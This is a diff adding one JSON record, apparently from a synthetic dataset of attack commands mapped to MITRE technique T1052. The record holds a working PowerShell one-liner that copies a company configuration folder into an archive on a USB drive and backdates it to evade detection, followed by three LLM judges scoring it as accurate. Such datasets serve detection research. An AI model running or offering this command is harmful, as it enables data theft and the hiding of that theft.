@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $tar=Join-Path $usb 'svc.tar'; tar -cf $tar -C 'C:\\ProgramData' 'Company\\Configs'; (Get-Item $tar).LastWriteTime = (Get-Date '2018-01-01')",
+  "explanation": "Creates a tar archive directly on the USB and backdates its timestamp to blend with older files.",
+  "rationale_steps": [
+    "Locate removable drive",
+    "Archive target configuration data directly onto USB",
+    "Modify file timestamp to reduce detection"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-b8a5d20a",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting, valid separators, correct cmdlet/parameter usage, and a valid tar invocation.",
+        "semantic_score": 5,
+        "semantic_justification": "Selects a removable drive, archives specified data directly to it, and backdates the file\u2019s timestamp, matching exfiltration over physical medium behavior.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:39:58.897704Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced parentheses, proper variable assignments, correct PowerShell cmdlet usage, and appropriate command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by identifying a removable drive, creating a tar archive of potentially sensitive configuration files directly on the USB drive, and backdating the timestamp to evade detection.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T09:40:01.572687Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell cmdlets, variable assignments, piping, command separators, and `tar` utility syntax with valid flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of exfiltrating data to a USB drive (`Get-Volume` and `tar -cf $usb`), and includes the anti-detection measure of backdating the file's timestamp (`Get-Item $tar).LastWriteTime = (Get-Date '2018-01-01')`), directly aligning with T1052's description of packaging data and avoiding detection.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:40:10.793768Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
